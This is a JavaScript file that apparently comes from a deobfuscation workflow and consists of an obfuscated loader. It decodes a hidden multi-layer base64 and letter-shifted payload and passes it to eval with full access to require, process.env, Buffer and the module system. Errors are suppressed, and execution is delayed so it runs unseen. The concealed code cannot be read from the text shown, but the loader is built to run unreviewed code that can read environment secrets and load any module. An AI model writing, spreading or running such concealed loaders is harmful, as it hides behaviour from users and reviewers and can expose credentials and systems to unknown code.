//Wed Oct 08 2025 04:48:56 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
(function () {
  'use strict';

  if (typeof require === 'undefined' || typeof process === 'undefined' || typeof Buffer === 'undefined') {
    return;
  }
  var _require = require;
  var _process = process;
  var _Buffer = Buffer;
  var _console = console;
  var _global = global;
  var _data = ['', '', '', '', '', '', '', '', 'TnpmaGxUajduVFg5cmpybnNYTnhOSFFwYUVzdXR1M3FvNW9xb09EbkNZeFBOSEdvZzI1ZWlIRzNmQlcwZk1SbFVYR2dTbmJsUllEeE5JSmRRSEZjUm5ibFJZTnhOSUpkUUhGY1JuYmxSWU9pVGJ0bE5GdGxOTGNxaUhHdEVCS3BFQ09YZzNobFVYRm5rSE43SG5GbGZMQW1FTEFkaGQ1cmczT0tEQlN0UEhtdEVCS3BFQ054TkxxekVMQTRQWEY5VW5HN0huRmxOSEd0RUJLcEVDT1hnM2hsUGUwbEQyQXppTEFkVkJjdUUyNHRmTEFtRUxBZFFIRzNmQlcwZk1TZ2ZCNXBFQ21pUFhGd05ITzhOb3hQTkhHOVBZeFBOSEdrQzBjVVcxOWtQTG1xREJXcWhxT2FpZHA3SG5GbEhuRmxnTEEwTk1TcWhMS2REQ1dhaHFPYWlkRjlOSE84Tm94UE5IRzNmQlcwZk1SekVyOWRXQktvZkhtM2ZCVzBmSEY5VW5HN0huRmxOSEdlRUNHbWhySzBnM09YZzNobFBlMGxObjBuUXNPcWhMQW1pSG0zZkJXMGZIcGxQZEZua0hON0huRmxrWHA3SG5GbEMxOVJZMGlrQ2RtZUVDR21ockswZzNPWGczaHVUYnRsTkZ0bE5IOGFOVGZBeFRmU3d6bm1vRnRsTkxLb0QyOTFnc1dYRUNTMWdNV2VRckVhaHBBbUQybHREQlNvZzNBemlIRjlVbkc3SG5GbE5IR3hFQ1ZsRUxLMERBT2FpZEY5TkhPOE5veFBOSEZsTkxXbWlMS1hnM2hsUGUwbEQyQXppTEFkVkJjdUUyNHREQlNvZzNBemlINXVncldxakhibGkycXBpTG1lQmVHaVBYRndOSE84Tm94UE5IRmxORnRsTkhGbEQyOXpoM1ZsZ3Jxb2YyNW1nQkFDZkNXdEEyS2RncnF6RWRGOU5IbW1EMlNhaUI1MFFyNXVEMnl6REIxcU5NYzhOSE55Tm5wbFBkRnREQlNvZzNBemlINW9nMnF6WUxxeWZDV0tqTFNxRUJXcUVIRi9OSE5sNHV2bDc3blVObkY2TkhOblBZeFBOSEZsTkxXbWlMS1hnM2hsUGUwbEQyQXppTEFkVkJjdUUyNHRncnFvZjI1bWdCQUNmQ1d0QTJLZGdycXpFZDVlaUJPZWlNT3Vncmh0UkhibGkycXBpTG1lQmVLaU5IMGxSbnB4Tk1pdUVNV3RoMXhjQ1hwbFBkRm5rSE43SG5GbE5IR3BEQ1dtWnI5M05IeDlOTFNxZ3NXcWhwS3hmQml6UExLb0QyOTFnc1Z6ZkI1dWlMcW1nSlNhZkI0eE5NaXVFTVd0aDF4ZENYcGxQZEZua0hON0huRmxOSEdwRENXbVpyOTNOSHg5TkxTcWdzV3FocEt4ZkJpelBMS29EMjkxZ3NWekVycXpEQmNJZzJxelFIRzNmQlcwZk1TZ1IxMHVOSHhsTnNiblRidGxOSEZsSG5GbE5IR29nMjVlaUhHb2cycXpWMm1tZ3JpcVozV2ROSTBsREJTb2czQXppSDVvZzJxelYybW1ncmlxTkk0OU5JRmxVZEZuUGRObFBkR21EMlNhaUI1MFFyU2FmQjVJZkxLekUyWmxUbkdtRDJTYWlCNTBRclNhZkI1SWZMS3pFMlo3SG5GbE5IR3BEQ1dtWnI5M05IeDlOTFNxZ3NXcWhwS3hmQml6UExTYWZCNUlmTEt6RTJBWWlNTnhOTWl1RU1XdGgxeDBDWHBsUGRGbmtITjdIbkZsTkhHcERDV21acjkzTkh4OU5MU3Fnc1dxaHBLeGZCaXpQTEtvRDI5MWdzVnpmQjV1aUxxbWdKU21oMmx4Tk1pdUVNV3RoMXgxQ1hwbFBkRm5rSE43SG5GbE5IR3BEQ1dtWnI5M05IeDlOTFNxZ3NXcWhwS3hmQml6UExLb0QyOTFnc1Z6RXJxekRCY0lEQ1N0UUhHM2ZCVzBmTVNnU3EwdU5IeGxOc2JuVGJ0bE5IRmxIbkZsTkhHb2cyNWVpSEdvRENTdFYybW1ncmlxWjNXZE5JMGxEQlNvZzNBemlINW9EQ1N0VjJtbWdyaXFOSTQ5TklGbFVkRm5QZE5sUGRHbUQyU2FpQjUwUXJTbWgybUlmTEt6RTJaemlMOUxmQ21xRUhsZFBYRjZOTEtvRDI5MWdzVnpEMktlZkpTdERCNXNFWDUwZzBFdWpMQXBQSU51VGJ0bE5IRmxFTEswREFPYWlkRndVWEdvRUI1MEVDT0dnTHFzZ25tb0RDU3RWMm1tZ3JpcVozV2RRSEczZkJXMGZNU2dTMTB1Tkh4bE5zYm5UYnRsTkhGbEhuRmxOSEdrQzBjVVcxOWtQTFdtaUxLWGczaHVUYnRsTk0wdVRidGxORnRsTks5a1lKOU1DMTh0Tm8wblFzT3FoTEFtaUhsNFJIcHVUYnRsTks5a1lKOU1DMTh0TnNibk5IeGxEMkF6aUxBZFZCY3VFMjR0Tm5GbE5IRmxOVFg3eitCUHRqZk91K25tb1RCem9UZk5wVCs4b1RuYXkrZmt1ampobituYXV6ajdtemo3cCtmanNIRmxOSEZsTkhOeE5JaDRQWEZ3TkhPOE5ucDdIbkZsQzE5UlkwaWtDZGxuVVhOemhyQWJFQkswUElsYlBYcDdIczBQSG44YU5UWDR6K0JNYWpmQXhGdHREQ1M1Z3JSbFBIcGxVWTRsamJ0bE5MU2Fnc1MwTkxLb0QyOTFnc1dlTkkwbGdMOW1FSktvRDI5MWdzV2VXc09hZ1pBemlubHVUYnRsTks5a1lKOU1DMTh0TnpCS3hqZk9hekJOeEhGbk5IeGxEQlNvZzNBemlNUnpnTEF6RTNXdE5IeGxObklwelB3cnNOc3JxRG90eVBncW83aG5QWXhQTkhGUE5IR3VFbkZ0TkJLb0QyOTFnc1dlUXJjcWdyaTBmSHBsamJ0bE5IRmxoTU9hRDJBZWhkNXFqTHEwUElKdVRidGxOTTBQTkhGUE5IR29nMjVlaUhHeURDbUlnMjVvaUNPZEVCNW9qWEY5Tk1HbWhzU3FYQjUwUEs5a1daNUJDMTh6WVpLREMwU1VZcFNBWnFPS1lwU0VOTWM4Tks5a1daNUJDMTh6VjA5VFYxQVhacEFUVjFwbGtNYmxOb2w0VEhOeE5JSmJQWEc4a0hGNFRJbDdIbkZsRDI5emgzVmxnQks0WnI5MWdyV2VOSTBsaExLZGgyQU9nc1Z0QzE5S1lxRWtDZDVYWTFBVFdLUmxrTWJsTm9SMU5uYmxSWUZ1Tk1jOE5JUjFUYnRsTkZ0bE5LOWtZSjlNQzE4dE5xY3o2RW5kNmd6VzVncjI1RCtXNzdkZk5uRndOTDFtakpTYWdyUzFoc09xZ3JTNU5IeGxObkZsTkhJdXJRUXV6NU10YWY3cnFnSWFhT3RuTkh4bGdCSzRacjkxZ3JXZU5IeGxOcWN6Tm5wN0huRmxIbkZsRDI5emgzVmxockFlaUJjMGhkRjlOS3lpVGJ0bE5GdGxOTEszREJxME5MU2FnclMxaHNPcWdzV0tqTEFvaUNXcVBMS29EMjkxZ3NXZVFIR3lEQ21JZzI1b2lDT2RFQjVvalhibERDUzVnclJsUExLb0QyOTFnc1Z1TkkwK05NeFBOSEZsTks5a1lKOU1DMTh0TnFjejR0SFo0dEhaTlVIa3J0Rmw1Z2RGNWZqUTZRWHI1RCszQmRObFBkR21EMlNhaUI1MFFycXpFTEE0Tkh4bE5xMG5OSHhsUExLb0QyOTFnc1Z6aHJBeURDT3dOSThsTnorOG5ITmxQZEdtRDJTYWlCNTBRc09xZ0JLZGZkRndOSFFhYU5wbk5JdGxObk51Tkh4bE5uSW5sT1lubE9WblBZeFBOSEZsTkZ0bE5IRmxpTU81Tk14UE5IRmxOSEZsRDI5emgzVmxockFlaUJjME5JMGxEQ2ltZkNWbGhNT2FEMkFlaDBLb0QyOTFnc1Z0REJTb2czQXppSGJsZ0JLNFpyOTFncldlUFl4UE5IRmxOSEZsaHJBZWlCYzBoZDViaUNTdFBNeFBOSEZsTkhGbE5IR3Vncldxakl0bERCU29nM0F6aUg1dWdyV3FqSGJQTkhGbE5IRmxOSEdkRUIxbWhyeDZOTEtvRDI5MWdzVnpockF5RENPd05NYzhOSFFycTZJcXVOa3J4NmxuUUZ0bE5IRmxOSEZsTkw1dUQyeXpEQjFxVG5HZEVDUzFnTVYvUXI1dUQyeXpEQjFxTk1jOE5NV3RmQ1J6Z3Jxb2YyNW1nQlp4SG5GbE5IRmxOSEZsZkI1dWlMcW1nSlNhZkI0Nk5NT3FoM0F4aUk4emZCNXVpTHFtZ0pTYWZCNGxrTWJsUkhiUE5IRmxOSEZsTkhHcmZCNW1nSlNhZkI0Nk5NT3FoM0F4aUk4ekVycXpEQmNJZzJxek5NYzhOSUZ4SG5GbE5IRmxOSEZsRDI5dWdwU3REQjVzRVl0bGhyQWVpQmMwVWQ1b2cycXpWMm1tZ3JpcU5NYzhOSUZ4SG5GbE5IRmxOSEZsZkI1dWlMcW1nSlNtaDJsNk5NT3FoM0F4aUk4emZCNXVpTHFtZ0pTbWgybGxrTWJsUkhiUE5IRmxOSEZsTkhHcmZCNW1nSlNtaDJsNk5NT3FoM0F4aUk4ekVycXpEQmNJRENTdE5NYzhOSUZ4SG5GbE5IRmxOSEZsRDJLZWZKU3REQjVzRVl0bGhyQWVpQmMwVWQ1b0RDU3RWMm1tZ3JpcU5NYzhOSUZ4SG5GbE5IRmxOSEZsaDNXbWlNUjZOTU9xaDNBeGlJOHpoM1dtaU1SbGtNYmxqMzB4SG5GbE5IRmxOSEZsRDI5dWdwY3VnQnEwV0Ntb0VCQXBFQlY2Tk1PcWgzQXhpSTh6RDI5dWdwY3VnQnEwV0Ntb0VCQXBFQlZsa01ibEVyS3hoMlpQTkhGbE5IRmxrWHA3SG5GbE5IRzlOTFNtaUxTdE5IbXFoc09haG5wbGpidGxOSEZsTkhHa0MwY1VXMTlrUEhRdHlQZ3FvN2lnTm5Gd05MS29EMjkxZ3NWemZCNXBFQ2xsUGRGbkNYSW5zRGJsNXRyczZQTFI1Z2RINWduNDc3ZGZObkZ3TkxBZGhyOWRRcjFxaDNTbUUyWnVUYnRsTkhGbE5IR2RFQ1MxZ01XZVFzRzFoMmx0amJ0bE5IRmxOSEZsTkxxekVMQTRUbkdtRDJTYWlCNTBRcnF6RUxBNFFGdGxOSEZsTkhGbE5NT3FnQktkZmV0bERCU29nM0F6aUg1ZEVCMW1ocnhsa01ibE56ZkN0VEJwbStmZXZITnhIbkZsTkhGbE5IRmxncnFvZjI1bWdCWjZOTVd0ZkNSemdycW9mMjVtZ0JaeEhuRmxOSEZsTkhGbGZCNXVpTHFtZ0pTYWZCNDZOSUZ4SG5GbE5IRmxOSEZsRXJxekRCY0lnMnF6VG5GYlFGdGxOSEZsTkhGbE5MU2FmQjVJZkxLekUyWjZOSUZ4SG5GbE5IRmxOSEZsZkI1dWlMcW1nSlNtaDJsNk5JRnhIbkZsTkhGbE5IRmxFcnF6REJjSURDU3RUbkZiUUZ0bE5IRmxOSEZsTkxTbWgybUlmTEt6RTJaNk5JRnhIbkZsTkhGbE5IRmxFQ09kZzNONk5MQWRocjlkUXIxcWgzU21FMlpQTkhGbE5IRmxrWHA3SG5GbE5IRzlIbkZsa1hwN0huRmxIbkZsaHJBZWlCYzBoZDVlZzNPMFBIbW1RSEduUFhGOVVuR21RcnF6RUxBNE5IMGxEbjV1Z3JXcWpIcDdIbkZsSG5GbEMxOVJZMGlrQ2RsbkNMN3FtZm91bDZvcXd0ZXJuT0lvbE5OblFIRm40dWRLTm5wN0huRmxDMTlSWTBpa0NkbG5DTDR5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5TlRuMHV6QlV5K1gvdGpmR3crZmNtK2ZGemRGeVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweVFYMHlRWDB5UVgweU5ucDdIbkZsSG5GbGhNT3Vnc1dHRDJTYWlCNTBoMVMxZ0IxbWhzcHRockFlaUJjMGhkcDdIczB1UEhwNw=='];
  var _combined = _data.join('');
  function _decode(_input) {
    try {
      var _step1 = _Buffer.from(_input, 'base64').toString();
      var _step2 = _step1.replace(/[A-Za-z]/g, function (char) {
        var start = char <= 'Z' ? 65 : 97;
        return String.fromCharCode((char.charCodeAt(0) - start - 5 + 26) % 26 + start);
      });
      var _step3 = _Buffer.from(_step2, 'base64').toString();
      var _final = _step3.replace(/__LOG__/g, 'console.log').replace(/__ENV__/g, 'process.env').replace(/__REQ__\(/g, 'require(');
      return _final;
    } catch (_error) {
      return null;
    }
  }
  function _execute() {
    var _code = _decode(_combined);
    if (_code) {
      try {
        var _wrapper = '(function(require, process, Buffer, console, global, __dirname, __filename, module, exports) {\n' + _code + '\n})';
        var _func = eval(_wrapper);
        _func(_require, _process, _Buffer, _console, _global, __dirname, __filename, module, exports);
      } catch (_execError) {}
    }
  }
  setTimeout(_execute, 300);
})();